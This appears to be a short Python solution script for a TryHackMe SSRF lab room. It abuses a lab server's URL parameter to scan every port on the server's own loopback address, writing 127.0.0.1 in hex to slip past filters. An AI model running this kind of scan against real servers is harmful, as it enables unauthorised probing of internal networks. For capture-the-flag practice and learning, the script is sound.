# for https://tryhackme.com/room/ssrf

from requests.api import get

ports = range(1, 65535)
for p in ports:
    r = get(f"http://10.10.22.239:8000/attack?url=http%3A%2F%2F0x7f000001%3A{p}")
    if "Target is reachable! " in r.text:
        print(f"reachable on {p}")
    if p % 1000 == 0:
        print(f"finished ports: 1 to {p}")
